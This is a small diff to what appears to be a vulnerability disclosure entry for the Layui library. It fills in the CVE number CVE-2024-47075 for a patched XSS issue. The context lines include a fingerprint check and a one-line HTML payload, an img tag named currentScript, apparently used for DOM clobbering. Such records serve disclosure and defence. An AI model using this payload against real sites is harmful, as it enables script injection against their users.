@@ -8,7 +8,7 @@
 + Fingerprint: `window.LAYUI_GLOBAL  !== undefined`
 + Payload: ```<img name="currentScript" src="https://xxx.xxx.xxx">```
 + Impact: XSS
-+ CVE: CVE-2024-XXXXX
++ CVE: CVE-2024-47075
 + Status: Patched
 + Security Policy: Requested
 + Foundby: TheHulk
